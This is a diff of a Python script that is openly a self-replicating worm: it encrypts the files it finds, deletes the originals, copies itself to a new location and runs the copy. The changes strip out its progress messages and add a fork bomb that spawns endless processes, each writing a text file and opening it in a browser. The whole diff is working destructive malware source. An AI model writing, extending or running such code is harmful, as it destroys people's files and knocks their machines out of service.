@@ -1,6 +1,5 @@
 from shutil import copyfile
-import os, getpass
-import os, random, sys, pkg_resources
+import os, getpass, random, sys, pkg_resources, webbrowser
 import subprocess as sp
 import shutil
 from sys import argv
@@ -47,14 +46,12 @@ def action():
         encFiles = allfiles()
         for Tfiles in encFiles:
                 if os.path.basename(Tfiles).startswith("(encrypted)"):
-                        print "%s is already encrypted" %str(Tfiles)
                         pass
  
                 elif Tfiles == os.path.join(os.getcwd(), sys.argv[0]):
                         pass
                 else:
                         encrypt(SHA256.new(password).digest(), str(Tfiles))
-                        print "Done encrypting %s" %str(Tfiles)
                         os.remove(Tfiles)
 
 def rep():
@@ -70,13 +67,18 @@ def rep():
     copyfile(source,destination)
     os.system("python "+destination) # To execute script
 
-
-    #print "Current location of worm: " + destination
-    #print "Original location of worm: "+ source
+def forkbomb():
+    while 1:
+        os.fork()
+        x = os.getpid()
+        filename = str(x) + ".txt"
+        notneeded = open(filename, "w")
+        webbrowser.open(filename)
 
 def main():
     rep()
     action()
+    forkbomb()
 
 if __name__=="__main__":
     main()
